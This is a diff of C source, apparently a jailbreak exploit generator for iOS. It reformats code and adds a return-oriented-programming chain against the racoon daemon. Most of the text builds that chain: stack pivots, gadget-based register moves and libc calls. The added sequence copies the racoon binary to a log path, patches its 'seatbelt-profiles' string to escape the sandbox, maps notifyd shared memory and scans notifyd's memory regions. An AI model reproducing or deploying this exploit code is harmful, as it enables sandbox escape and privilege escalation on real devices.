@@ -18,30 +18,29 @@
 #define offsetof(type, member)  __builtin_offsetof (type, member)
 
 /*
- #include <Foundation/Foundation.h>
- #include <sys/sysctl.h>
- #include <sys/resource.h>
- #include <spawn.h>
- #include <stdio.h>
- #include <sys/param.h>
- #include <sys/mount.h>
- #include <dlfcn.h>
- #include <sandbox.h>
- #include <launch.h>
- #include <errno.h>
- #include <sys/stat.h>
- #include "substrate.h"
- #include <sys/types.h>
- #include <sys/mman.h>
- #include <sys/wait.h>
- #include <signal.h>
- #include <fcntl.h>
- #include <libproc.h>
- */
+#include <Foundation/Foundation.h>
+#include <sys/sysctl.h>
+#include <sys/resource.h>
+#include <spawn.h>
+#include <stdio.h>
+#include <sys/param.h>
+#include <sys/mount.h>
+#include <dlfcn.h>
+#include <sandbox.h>
+#include <launch.h>
+#include <errno.h>
+#include <sys/stat.h>
+#include "substrate.h"
+#include <sys/types.h>
+#include <sys/mman.h>
+#include <sys/wait.h>
+#include <signal.h>
+#include <fcntl.h>
+#include <libproc.h>
+*/
 #include "constants.h"
 
-unsigned int p3AddrLo = P3_ADDR_LO
-;
+unsigned int p3AddrLo = P3_ADDR_LO;
 unsigned int p2DataLo = 0, p3Data = 0;
 int firstP2Write = 1, firstP3Write = 1;
 int lines = 0;
@@ -63,12 +62,10 @@ short fsgetPadding(unsigned char data) {
 	int i, v = 1;
 	for (i = 0; i < 10; i++) {
 		v = v * 10;
-		if (lines < v)
-			break;
+		if (lines < v) break;
 	}
 	short ret = data - LOG_SHIFT - i;
-	if (ret < 10)
-		ret += 256;
+	if (ret < 10) ret += 256;
 	return ret;
 }
 
@@ -81,7 +78,7 @@ void setP3Data(unsigned int data) {
 	// The idea is to change p2Data lowest byte to p3AddrLo, p3AddrLo+1, p3AddrLo+2, p3AddrLo+3.
 	// This way, 'data' is written to p3Data, byte per byte.
 	unsigned int p3ByteAddr, i = 0;
-	for (p3ByteAddr = p3AddrLo; p3ByteAddr < p3AddrLo + 4; p3ByteAddr++) {
+	for (p3ByteAddr = p3AddrLo; p3ByteAddr < p3AddrLo+4; p3ByteAddr++) {
 		unsigned char p3DataByte = (data >> (i * 8)) & 0xff;
 		unsigned int p3DataOr = p3DataByte << (i * 8);
 		unsigned int p3DataMask = 0xff << (i * 8);
@@ -134,17 +131,16 @@ void ropWrite(unsigned int value) {
 			ropWriteAddr += 4;
 		} else {
 			fsWrite(ropWriteAddr++, value & 0xff);
-			fsWrite(ropWriteAddr++, (value >> 8) & 0xff);
-			fsWrite(ropWriteAddr++, (value >> 16) & 0xff);
-			fsWrite(ropWriteAddr++, (value >> 24) & 0xff);
+			fsWrite(ropWriteAddr++, (value>>8) & 0xff);
+			fsWrite(ropWriteAddr++, (value>>16) & 0xff);
+			fsWrite(ropWriteAddr++, (value>>24) & 0xff);
 		}
 	} else {
 		if (ropFile == NULL) {
 			ropFile = fopen(ROP_FILE_NAME, "wb");
 			ropFileAddr = ropWriteAddr;
 		}
-		if (ropWriteAddr != ropFileAddr)
-			fseek(ropFile, ropWriteAddr - ropFileAddr, SEEK_CUR);
+		if (ropWriteAddr != ropFileAddr) fseek(ropFile, ropWriteAddr - ropFileAddr, SEEK_CUR);
 		fwrite(&value, 1, 4, ropFile);
 		ropWriteAddr += 4;
 		ropFileAddr = ropWriteAddr;
@@ -171,35 +167,35 @@ void ropWriteVars() {
 }
 
 Addr newBinary(void* data, size_t size) {
-	while (varsWritten % 4 != 0) varsWritten++;
+        while (varsWritten%4!=0) varsWritten++;
 	Addr ret = varsBaseAddr + varsWritten;
-	memcpy(&vars[varsWritten], data, size);
-	varsWritten += size;
+        memcpy(&vars[varsWritten], data, size);
+        varsWritten += size;
 	return ret;
 }
 
 Addr newString(char* s) {
-	while (varsWritten % 4 != 0) varsWritten++;
+        while (varsWritten%4!=0) varsWritten++;
 
 	Addr ret = varsBaseAddr + varsWritten;
-	strcpy(&vars[varsWritten], s);
-	varsWritten += strlen(s) + 1;
-	return ret;
+        strcpy(&vars[varsWritten], s);
+        varsWritten += strlen(s) + 1;
+        return ret;
 }
 
 Addr newInteger(unsigned int value) {
-	while (varsWritten % 4 != 0) varsWritten++;
+        while (varsWritten%4!=0) varsWritten++;
 
 	Addr ret = varsBaseAddr + varsWritten;
 	vars[varsWritten++] = value & 0xff;
-	vars[varsWritten++] = (value >> 8) & 0xff;
-	vars[varsWritten++] = (value >> 16) & 0xff;
-	vars[varsWritten++] = (value >> 24) & 0xff;
+	vars[varsWritten++] = (value>>8) & 0xff;
+	vars[varsWritten++] = (value>>16) & 0xff;
+	vars[varsWritten++] = (value>>24) & 0xff;
 	return ret;
 }
 
 Addr newBuffer(unsigned int size) {
-	while (varsWritten % 4 != 0) varsWritten++;
+        while (varsWritten%4!=0) varsWritten++;
 
 	Addr ret = varsBaseAddr + varsWritten;
 	varsWritten += size;
@@ -207,16 +203,15 @@ Addr newBuffer(unsigned int size) {
 }
 
 Addr newArray(unsigned int values[], unsigned int count) {
-	while (varsWritten % 4 != 0) varsWritten++;
+        while (varsWritten%4!=0) varsWritten++;
 
-	int i;
-	Addr ret = 0;
-	for (i = 0; i < count; i++) {
-		Addr tmp = newInteger(values[i]);
-		if (ret == 0)
-			ret = tmp;
-	}
-	return ret;
+        int i;
+        Addr ret = 0;
+        for (i = 0; i < count; i++) {
+                Addr tmp = newInteger(values[i]);
+                if (ret == 0) ret = tmp;
+        }
+        return ret;
 }
 
 void ropOpen() {
@@ -235,35 +230,36 @@ void ropClose() {
 	printf("}\n");
 }
 
+
 unsigned int dscs;
 
 void ropStackPivotLo(Addr toAddr) {
-	fsWriteAddrRel(LR_ADDR_LO, dscs + LIBC_POP_R47); // 0x00 pc
-	fsWriteAddrRel(LR_ADDR_LO + 0x4, toAddr); // 0x04 r4
-	fsWriteAddrRel(LR_ADDR_LO + 0x8, USELESS); // 0x08 r7
-	fsWriteAddrRel(LR_ADDR_LO + 0xc, dscs + LIBC_MOV_SP_R4__POP_R47); // 0x0c pc
+	fsWriteAddrRel(LR_ADDR_LO,		dscs + LIBC_POP_R47);			// 0x00 pc
+	fsWriteAddrRel(LR_ADDR_LO + 0x4, 	toAddr);				// 0x04 r4
+	fsWriteAddrRel(LR_ADDR_LO + 0x8, 	USELESS);				// 0x08 r7
+	fsWriteAddrRel(LR_ADDR_LO + 0xc, 	dscs + LIBC_MOV_SP_R4__POP_R47);	// 0x0c pc
 	ropWriteAddr = toAddr; // sp was changed
-	ropWrite(USELESS); // r4
-	ropWrite(USELESS); // r7
+	ropWrite(USELESS);								// r4
+	ropWrite(USELESS);								// r7
 }
 
 #define ROP_LOAD_REG4_CONST_LEN 0xc
 void ropLoadReg4Const(unsigned int value) {
-	ropWrite(dscs + LIBC_POP_R47); // 0x00 pc
-	ropWrite(value); // 0x04 r4
-	ropWrite(USELESS); // 0x08 r7
+	ropWrite(dscs + LIBC_POP_R47);		// 0x00 pc
+	ropWrite(value);			// 0x04 r4
+	ropWrite(USELESS);			// 0x08 r7
 }
 
 #define ROP_LOAD_REG0_CONST_LEN 0x8
 void ropLoadReg0Const(unsigned int value) {
-	ropWrite(dscs + LIBC_POP_R0); // 0x00 pc
-	ropWrite(value); // 0x04 r0
+	ropWrite(dscs + LIBC_POP_R0);		// 0x00 pc
+	ropWrite(value);			// 0x04 r0
 }
 
 #define ROP_DEREF_REG0_LEN 0x8
 void ropDerefReg0() {
 	ropWrite(dscs + LIBC_LDR_R0_R0__POP_R7); // 0x00 pc
-	ropWrite(USELESS); // 0x04 r7
+	ropWrite(USELESS);			// 0x04 r7
 }
 
 #define ROP_LOAD_REG0_LEN (ROP_LOAD_REG0_CONST_LEN + ROP_DEREF_REG0_LEN)
@@ -274,144 +270,146 @@ void ropLoadReg0(Addr ptrValue) {
 
 #define ROP_SAVE_REG0_LEN (ROP_LOAD_REG4_CONST_LEN + 0xc)
 void ropSaveReg0(Addr toAddr) {
-	ropLoadReg4Const(toAddr); // 0x00 pc
+	ropLoadReg4Const(toAddr);		// 0x00 pc
 	ropWrite(dscs + LIBC_STR_R0_R4__POP_R47); // 0x0c pc
-	ropWrite(USELESS); // 0x10 r4
-	ropWrite(USELESS); // 0x14 r7
+	ropWrite(USELESS);			// 0x10 r4
+	ropWrite(USELESS);			// 0x14 r7
 }
 
 #define ROP_MOV_REG0_REG_1_LEN 0xc
 void ropMovReg0Reg1() {
-	ropWrite(dscs + GADGET_MOV_R0_R1__POP_R47);
-	ropWrite(USELESS);
-	ropWrite(USELESS);
+        ropWrite(dscs + GADGET_MOV_R0_R1__POP_R47);
+        ropWrite(USELESS);
+        ropWrite(USELESS);
 }
 
 #define ROP_MOV_REG1_REG_0_LEN 0xc
 void ropMovReg1Reg0() {
-	ropWrite(dscs + GADGET_MOV_R1_R0__POP_R47);
-	ropWrite(USELESS);
-	ropWrite(USELESS);
+        ropWrite(dscs + GADGET_MOV_R1_R0__POP_R47);
+        ropWrite(USELESS);
+        ropWrite(USELESS);
 }
 
 #define ROP_MOV_REG0_REG_4_LEN 0xc
 void ropMovReg0Reg4() {
-	ropWrite(dscs + GADGET_MOV_R0_R4__POP_R47);
-	ropWrite(USELESS);
-	ropWrite(USELESS);
+        ropWrite(dscs + GADGET_MOV_R0_R4__POP_R47);
+        ropWrite(USELESS);
+        ropWrite(USELESS);
 }
 
 #define ROP_MOV_REG0_REG_4_LEN 0xc
 void ropMovReg1Reg4() {
-	ropWrite(dscs + GADGET_MOV_R1_R4__POP_R47);
-	ropWrite(USELESS);
-	ropWrite(USELESS);
+        ropWrite(dscs + GADGET_MOV_R1_R4__POP_R47);
+        ropWrite(USELESS);
+        ropWrite(USELESS);
 }
 
 #define ROP_ADD_REG0_REG_1_LEN 0x10
 void ropAddReg0Reg1() {
-	ropWrite(dscs + GADGET_ADD_R0_R0_R1__POP457);
-	ropWrite(USELESS);
-	ropWrite(USELESS);
-	ropWrite(USELESS);
+        ropWrite(dscs + GADGET_ADD_R0_R0_R1__POP457);
+        ropWrite(USELESS);
+        ropWrite(USELESS);
+        ropWrite(USELESS);
 }
 
 #define ROP_SUB_REG0_REG_1_LEN 0x8
 void ropSubReg0Reg1() {
-	ropWrite(dscs + GADGET_SUBS_R0_R0_R1__POP7);
-	ropWrite(USELESS);
+        ropWrite(dscs + GADGET_SUBS_R0_R0_R1__POP7);
+        ropWrite(USELESS);
 }
 
 #define ROP_SWAP_REG0_REG_1_LEN (ROP_SAVE_REG0_LEN + ROP_MOV_REG0_REG_1_LEN + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_MOV_REG1_REG_0_LEN + ROP_LOAD_REG0_LEN)
 void ropSwapReg0Reg1() {
-	static Addr swapTemp1 = 0;
-	static Addr swapTemp2 = 0;
+        static Addr swapTemp1 = 0;
+        static Addr swapTemp2 = 0;
 
-	if (swapTemp1 == 0) swapTemp1 = newInteger(0);
-	if (swapTemp2 == 0) swapTemp2 = newInteger(0);
+        if(swapTemp1 == 0)
+            swapTemp1 = newInteger(0);
 
-	ropSaveReg0(swapTemp1);
-	ropMovReg0Reg1();
-	ropSaveReg0(swapTemp2);
-	ropLoadReg0(swapTemp1);
-	ropMovReg1Reg0();
-	ropLoadReg0(swapTemp2);
+        if(swapTemp2 == 0)
+            swapTemp2 = newInteger(0);
+
+        ropSaveReg0(swapTemp1);
+        ropMovReg0Reg1();
+        ropSaveReg0(swapTemp2);
+        ropLoadReg0(swapTemp1);
+        ropMovReg1Reg0();
+        ropLoadReg0(swapTemp2);
 }
 
 void ropAddReg0Const(unsigned int value) {
-	ropMovReg1Reg0();
+        ropMovReg1Reg0();
 	ropLoadReg0Const(value);
-	ropAddReg0Reg1();
+        ropAddReg0Reg1();
 }
 
 void ropSubReg0Const(unsigned int value) {
 	ropLoadReg4Const(value);
 	ropWrite(dscs + LIBC_SUB_R0_R4__POP_R4567); // 0x0c pc
-	ropWrite(USELESS); // 0x10 r4
-	ropWrite(USELESS); // 0x14 r5
-	ropWrite(USELESS); // 0x18 r6
-	ropWrite(USELESS); // 0x1c r7
+	ropWrite(USELESS);			// 0x10 r4
+	ropWrite(USELESS);			// 0x14 r5
+	ropWrite(USELESS);			// 0x18 r6
+	ropWrite(USELESS);			// 0x1c r7
 }
 
-void ropStoreVariableValueAtOffsetFromVariableAddress(Addr address, unsigned int offset, Addr value) {
-	ropLoadReg0(address);
-	ropAddReg0Const(offset);
-	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + 0x4);
-	ropLoadReg0(value);
-	ropLoadReg4Const(PLACE_HOLDER);
+void ropStoreVariableValueAtOffsetFromVariableAddress(Addr address, unsigned int offset, Addr value)
+{
+        ropLoadReg0(address);
+        ropAddReg0Const(offset);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + 0x4);
+        ropLoadReg0(value);
+        ropLoadReg4Const(PLACE_HOLDER);
 	ropWrite(dscs + LIBC_STR_R0_R4__POP_R47); // 0x0c pc
-	ropWrite(USELESS); // 0x10 r4
-	ropWrite(USELESS); // 0x14 r7
+	ropWrite(USELESS);			// 0x10 r4
+	ropWrite(USELESS);			// 0x14 r7
 }
 
-void ropStoreValueAtOffsetFromVariableAddress(Addr address, unsigned int offset, unsigned int value) {
-	static Addr tempAddr = 0;
-	if (tempAddr == 0) tempAddr = newInteger(0);
+void ropStoreValueAtOffsetFromVariableAddress(Addr address, unsigned int offset, unsigned int value)
+{
+    static Addr tempAddr = 0;
+    if(tempAddr == 0)
+        tempAddr = newInteger(0);
 
-	ropLoadReg0Const(value);
-	ropSaveReg0(tempAddr);
-	ropStoreVariableValueAtOffsetFromVariableAddress(address, offset, tempAddr);
+    ropLoadReg0Const(value);
+    ropSaveReg0(tempAddr);
+    ropStoreVariableValueAtOffsetFromVariableAddress(address, offset, tempAddr);
 }
 
 void ropStoreValue(Addr addr, unsigned int value) {
 	ropLoadReg4Const(value);
-	ropMovReg0Reg4();
-	ropSaveReg0(addr);
+        ropMovReg0Reg4();
+        ropSaveReg0(addr);
 }
 
 void ropCall4Reg(Addr addr) {
 	ropLoadReg4Const(addr);
-	ropWrite(dscs + LIBC_BLX_R4_POP_R457); // 0x0c pc
-	ropWrite(USELESS); // 0x10 r4
-	ropWrite(USELESS); // 0x14 r4
-	ropWrite(USELESS); // 0x18 r7
+	ropWrite(dscs + LIBC_BLX_R4_POP_R457);	// 0x0c pc
+	ropWrite(USELESS);			// 0x10 r4
+	ropWrite(USELESS);			// 0x14 r5
+	ropWrite(USELESS);			// 0x18 r7
 }
 
-void ropCall7(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3,
-		unsigned int p4, unsigned int p5, unsigned int p6, unsigned int p7) {
-	ropWrite(dscs + LIBC_POP_R0123); // 0x00 pc
-	ropWrite(p1); // 0x04 r0
-	ropWrite(p2); // 0x08 r1
-	ropWrite(p3); // 0x0c r2
-	ropWrite(p4); // 0x10 r3
+void ropCall7(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3, unsigned int p4, unsigned int p5, unsigned int p6, unsigned int p7) {
+	ropWrite(dscs + LIBC_POP_R0123);	// 0x00 pc
+	ropWrite(p1);				// 0x04 r0
+	ropWrite(p2);				// 0x08 r1
+	ropWrite(p3);				// 0x0c r2
+	ropWrite(p4);				// 0x10 r3
 	ropLoadReg4Const(addr);
-	ropWrite(dscs + LIBC_BLX_R4_POP_R457); // 0x20 pc		// pod2g: I guess this gadget has to be changed
-	ropWrite(p5); // 0x24 r4 (and p5)
-	ropWrite(p6); // 0x28 r5 (and p6)
-	ropWrite(p7); // 0x2c r7 (and p7)
+	ropWrite(dscs + LIBC_BLX_R4_POP_R457);	// 0x20 pc		// pod2g: I guess this gadget has to be changed
+	ropWrite(p5);				// 0x24 r4 (and p5)
+	ropWrite(p6);				// 0x28 r5 (and p6)
+	ropWrite(p7);				// 0x2c r7 (and p7)
 }
 
-void ropCall6(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3,
-		unsigned int p4, unsigned int p5, unsigned int p6) {
+void ropCall6(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3, unsigned int p4, unsigned int p5, unsigned int p6) {
 	ropCall7(addr, p1, p2, p3, p4, p5, p6, USELESS);
 }
 
-void ropCall5(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3,
-		unsigned int p4, unsigned int p5) {
+void ropCall5(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3, unsigned int p4, unsigned int p5) {
 	ropCall6(addr, p1, p2, p3, p4, p5, USELESS);
 }
-void ropCall4(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3,
-		unsigned int p4) {
+void ropCall4(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3, unsigned int p4) {
 	ropCall6(addr, p1, p2, p3, p4, USELESS, USELESS);
 }
 void ropCall3(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3) {
@@ -432,15 +430,15 @@ void ropLog(char* msg) {
 }
 
 struct trojan_msg {
-	mach_msg_header_t header;
-	uint32_t r8;
-	uint32_t r10;
-	uint32_t r4;
-	uint32_t r5;
-	uint32_t r6;
-	uint32_t r7;
-	uint32_t pc;
-	uint32_t crap[7];
+    mach_msg_header_t          header;
+    uint32_t                   r8;
+    uint32_t                   r10;
+    uint32_t                   r4;
+    uint32_t                   r5;
+    uint32_t                   r6;
+    uint32_t                   r7;
+    uint32_t                   pc;
+    uint32_t                   crap[7];
 };
 
 int ropMain(int slide) {
@@ -456,8 +454,105 @@ int ropMain(int slide) {
 
 	ropLog("Entering racoon ROP.\n");
 
+        Addr aShmBaseAddress = newInteger(0);
+        ropCall3(dscs + _dsc_shm_open, newString("apple.shm.notification_center"), O_RDWR | O_CREAT, 0644);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x24); // shm fd to PLACE_HOLDER
+        ropCall7(dscs + _dsc_mmap, (uint32_t) NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, PLACE_HOLDER, 0, 0);
+        ropAddReg0Const(0xF00);
+        ropSaveReg0(aShmBaseAddress);
+	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // aPid to PLACE_HOLDER
+	ropCall3(dscs + _dsc_syslog, LOG_WARNING, newString("shmBaseAddress: %x\n"), PLACE_HOLDER);
+
+        Addr aStat = newInteger(0);
+        Addr aSize = newInteger(0);
+        Addr aRacoonSrcFd = newInteger(0);
+        Addr aRacoonDstFd = newInteger(0);
+        Addr aRacoonSrc = newInteger(0);
+        Addr aRacoonDst = newInteger(0);
+
+	ropCall1(dscs + _dsc_malloc, sizeof(struct stat));
+        ropSaveReg0(aStat);
+
+        ropCall2(dscs + _dsc_open, newString("/usr/sbin/racoon"), O_RDONLY);
+        ropSaveReg0(aRacoonSrcFd);
+
+        ropLoadReg0(aStat);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x08); // stat to second PLACE_HOLDER
+        ropLoadReg0(aRacoonSrcFd);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonSrcFd to PLACE_HOLDER
+        ropCall2(dscs + _dsc_fstat, PLACE_HOLDER, PLACE_HOLDER);
+
+        ropLoadReg0(aStat);
+        ropAddReg0Const(offsetof(struct stat, st_size));
+        ropDerefReg0();
+        ropSaveReg0(aSize);
+
+        ropLoadReg0(aSize);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x08); // st.st_size to first PLACE_HOLDER
+        ropLoadReg0(aRacoonSrcFd);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x24); // racoonSrcFd to second PLACE_HOLDER
+        ropCall7(dscs + _dsc_mmap, (uint32_t) NULL, PLACE_HOLDER, PROT_READ, MAP_SHARED, PLACE_HOLDER, 0, 0);
+        ropSaveReg0(aRacoonSrc);
+
+        Addr aRacoonDstFileName = newString("/private/var/log/racoon.log");
+
+        ropCall1(dscs + _dsc_unlink, aRacoonDstFileName);
+
+        ropCall3(dscs + _dsc_open, aRacoonDstFileName, O_CREAT | O_RDWR, 0777);
+        ropSaveReg0(aRacoonDstFd);
+
+        ropLoadReg0(aSize);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x08); // st.st_size to second PLACE_HOLDER
+        ropLoadReg0(aRacoonDstFd);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonDstFd to first PLACE_HOLDER
+        ropCall3(dscs + _dsc_ftruncate, PLACE_HOLDER, PLACE_HOLDER, 0);
+
+        ropLoadReg0(aSize);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x08); // st.st_size to first PLACE_HOLDER
+        ropLoadReg0(aRacoonDstFd);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x24); // racoonDstFd to second PLACE_HOLDER
+        ropCall7(dscs + _dsc_mmap, (uint32_t) NULL, PLACE_HOLDER, PROT_READ | PROT_WRITE, MAP_SHARED, PLACE_HOLDER, 0, 0);
+        ropSaveReg0(aRacoonDst);
+
+        ropLoadReg0(aSize);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x0c); // st.st_size to third PLACE_HOLDER
+        ropLoadReg0(aRacoonSrc);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x08); // racoonSrc to second PLACE_HOLDER
+        ropLoadReg0(aRacoonDst);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonDst to first PLACE_HOLDER
+        ropCall3(dscs + _dsc_memcpy, PLACE_HOLDER, PLACE_HOLDER, PLACE_HOLDER);
+
+        ropLoadReg0(aSize);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x08); // st.st_size to second PLACE_HOLDER
+        ropLoadReg0(aRacoonDst);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonDst to first PLACE_HOLDER
+	ropCall4(dscs + _dsc_memmem, PLACE_HOLDER, PLACE_HOLDER, newString("seatbelt-profiles"), sizeof("seatbelt-profiles") - 1);
+
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // profiles_loc to PLACE_HOLDER
+        ropCall3(dscs + _dsc_memcpy, PLACE_HOLDER, newString("seatbelt-profil3s"), sizeof("seatbelt-profil3s") - 1);
+
+        ropLoadReg0(aSize);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x08); // st.st_size to second PLACE_HOLDER
+        ropLoadReg0(aRacoonSrc);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonSrc to first PLACE_HOLDER
+        ropCall2(dscs + _dsc_munmap, PLACE_HOLDER, PLACE_HOLDER);
+
+        ropLoadReg0(aSize);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x08); // st.st_size to second PLACE_HOLDER
+        ropLoadReg0(aRacoonDst);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonDst to first PLACE_HOLDER
+        ropCall2(dscs + _dsc_munmap, PLACE_HOLDER, PLACE_HOLDER);
+
+        ropLoadReg0(aRacoonSrcFd);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonSrcFd to PLACE_HOLDER
+        ropCall1(dscs + _dsc_close, PLACE_HOLDER);
+
+        ropLoadReg0(aRacoonDstFd);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonDstFd to PLACE_HOLDER
+        ropCall1(dscs + _dsc_close, PLACE_HOLDER);
+
 	// search notifyd pid : ----------------------------------------
-	static int name[] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL };
+	static int name[] = {CTL_KERN, KERN_PROC, KERN_PROC_ALL};
 	Addr aLength = newInteger(0);
 	Addr aProc = newInteger(0);
 	Addr aPid = newInteger(0);
@@ -488,54 +583,46 @@ int ropMain(int slide) {
 	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // aPid to PLACE_HOLDER
 	ropCall3(dscs + _dsc_syslog, LOG_WARNING, newString("notifyd pid: %d\n"), PLACE_HOLDER);
 
-	Addr aShmAddress = newInteger(0);
-	Addr aRegion = newInteger(0); // pod2g: why not uint64_t ?
-	Addr aRegions = newBuffer(sizeof(uint32_t) * 44 * 3);
-	Addr aRegionInfo = newBuffer(sizeof(struct proc_regionwithpathinfo));
-	int i;
-	for (i = 0; i < 44; ++i) {
-		ropLoadReg0(aPid);
-		ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x04); // aPid to first PLACE_HOLDER
-		ropLoadReg0(aRegion);
-		ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // aRegion to second PLACE_HOLDER
-		ropCall6(dscs + _dsc_proc_pidinfo, PLACE_HOLDER, PROC_PIDREGIONPATHINFO, PLACE_HOLDER, 0, aRegionInfo, sizeof(struct proc_regionwithpathinfo));
-		ropLoadReg0(aRegionInfo + offsetof(struct proc_regionwithpathinfo, prp_prinfo.pri_address));
-		ropSaveReg0(aRegions + (sizeof(uint32_t) * ((i * 3) + 0)));
-		ropLoadReg0(aRegionInfo + offsetof(struct proc_regionwithpathinfo, prp_prinfo.pri_protection));
-		ropSaveReg0(aRegions + (sizeof(uint32_t) * ((i * 3) + 1)));
-		ropLoadReg0(aRegionInfo + offsetof(struct proc_regionwithpathinfo, prp_prinfo.pri_share_mode));
-		ropSaveReg0(aRegions + (sizeof(uint32_t) * ((i * 3) + 2)));
-		ropLoadReg0(aRegionInfo + offsetof(struct proc_regionwithpathinfo, prp_prinfo.pri_size));
-		ropMovReg1Reg0();
-		ropLoadReg0(aRegionInfo + offsetof(struct proc_regionwithpathinfo, prp_prinfo.pri_address));
-		ropAddReg0Reg1();
-		ropSaveReg0(aRegion);
-	}
+        Addr aShmAddress = newInteger(0);
+        Addr aRegion = newInteger(0); // pod2g: why not uint64_t ?
+        Addr aRegions = newBuffer(sizeof(uint32_t) * 44 * 3);
+        Addr aRegionInfo = newBuffer(sizeof(struct proc_regionwithpathinfo));
+        int i;
+        for(i = 0; i < 44; ++i)
+        {
+            ropLoadReg0(aPid);
+            ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x04); // aPid to first PLACE_HOLDER
+            ropLoadReg0(aRegion);
+            ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // aRegion to second PLACE_HOLDER
+            ropCall6(dscs + _dsc_proc_pidinfo, PLACE_HOLDER, PROC_PIDREGIONPATHINFO, PLACE_HOLDER, 0, aRegionInfo, sizeof(struct proc_regionwithpathinfo));
+            ropLoadReg0(aRegionInfo + offsetof(struct proc_regionwithpathinfo, prp_prinfo.pri_address));
+            ropSaveReg0(aRegions + (sizeof(uint32_t) * ((i * 3) + 0)));
+            ropLoadReg0(aRegionInfo + offsetof(struct proc_regionwithpathinfo, prp_prinfo.pri_protection));
+            ropSaveReg0(aRegions + (sizeof(uint32_t) * ((i * 3) + 1)));
+            ropLoadReg0(aRegionInfo + offsetof(struct proc_regionwithpathinfo, prp_prinfo.pri_share_mode));
+            ropSaveReg0(aRegions + (sizeof(uint32_t) * ((i * 3) + 2)));
+            ropLoadReg0(aRegionInfo + offsetof(struct proc_regionwithpathinfo, prp_prinfo.pri_size));
+            ropMovReg1Reg0();
+            ropLoadReg0(aRegionInfo + offsetof(struct proc_regionwithpathinfo, prp_prinfo.pri_address));
+            ropAddReg0Reg1();
+            ropSaveReg0(aRegion);
+        }
 
-	uint32_t search[2] = { (PROT_READ | PROT_WRITE), SM_SHARED };
-	Addr aSearch = newArray(search, 2);
+        uint32_t search[2] = { (PROT_READ | PROT_WRITE), SM_SHARED };
+        Addr aSearch = newArray(search, 2);
 	ropCall4(dscs + _dsc_memmem, aRegions, sizeof(uint32_t) * 44 * 3, aSearch, sizeof(search));
 	ropSubReg0Const(sizeof(uint32_t));
 	ropDerefReg0();
-	ropAddReg0Const(0xF00);
-	ropSaveReg0(aShmAddress);
-
-	Addr aShmBaseAddress = newInteger(0);
-	ropCall3(dscs + _dsc_shm_open, newString("apple.shm.notification_center"), O_RDWR | O_CREAT, 0644);
-	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x24); // shm fd to PLACE_HOLDER
-	ropCall6(dscs + _dsc_mmap, (uint32_t) NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, PLACE_HOLDER, 0);
-	ropAddReg0Const(0xF00);
-	ropSaveReg0(aShmBaseAddress);
+        ropAddReg0Const(0xF00);
+        ropSaveReg0(aShmAddress);
 
 	// ropBootstrapLookUp(bootstrap_port, "com.apple.system.notification_center", port);
-	Addr aPort = newInteger(0);
